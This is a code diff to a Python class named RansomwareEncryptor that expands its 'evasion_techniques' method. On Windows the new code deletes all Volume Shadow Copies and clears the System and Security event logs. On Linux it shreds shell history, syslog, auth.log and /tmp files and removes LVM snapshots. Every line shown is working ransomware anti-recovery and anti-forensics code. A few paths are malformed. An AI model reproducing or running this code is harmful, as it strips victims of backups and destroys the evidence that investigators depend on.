@@ -373,17 +373,58 @@ class RansomwareEncryptor:
         return original_hash == new_hash
     
 #############################################################################################################
-#### Evansion's function
-#############################################################################################################
+#### Evanilson's function
+############################################################################################################
     def evasion_techniques(self):
         """
-        Evasion techniques to disable Windows recovery and cover tracks:
-        1. Delete all Volume Shadow Copies (vssadmin delete shadows /all /quiet)
-        2. Clear the System event log (wevtutil cl System)
+        Performs OS-appropriate evasion techniques:
+        - Windows: Disables recovery features and clears logs
+        - Linux: Clears shell history and system logs
+        Returns:
+            bool: True if all operations succeeded, False otherwise
         """
-        if os.name == 'nt':
-            try:
-                subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"], check=False)
-                subprocess.run(["wevtutil", "cl", "System"], check=False)
-            except Exception:
-                pass
+        success = True
+        try:
+            if os.name == 'nt':
+                # Windows techniques
+                commands = [
+                    ["vssadmin", "delete", "shadows", "/all", "/quiet"],
+                    ["wevtutil", "cl", "System"],
+                    ["powershell", "Clear-EventLog", "-LogName", "Security"]
+                ]
+            elif os.name == 'posix':
+                # Linux techniques
+                commands = [
+                    # Clear shell history files
+                    ["shred", "-uf", os.path.expanduser("~/.bash_history")],
+                    ["shred", "-uf", os.path.expanduser("~/.zsh_history")],
+                    # Clear system logs (requires root)
+                    ["sudo", "shred", "-uf", "/var/log/syslog"],
+                    ["sudo", "shred", "-uf", "/var/log/auth.log"],
+                    # Clear temporary files
+                    ["sudo", "shred", "-uf", "/tmp/*"],
+                    # Remove LVM snapshots if exist
+                    ["sudo", "lvremove", "-f", "/dev//snap"]
+                ]
+            else:
+                return False  # Unsupported OS
+
+            for cmd in commands:
+                try:
+                    result = subprocess.run(
+                        cmd,
+                        stdout=subprocess.DEVNULL,
+                        stderr=subprocess.DEVNULL,
+                        check=True,
+                        timeout=10
+                    )
+                except (subprocess.CalledProcessError, 
+                        subprocess.TimeoutExpired,
+                        FileNotFoundError,
+                        PermissionError):
+                    success = False
+
+        except Exception as e:
+            success = False
+
+        return success
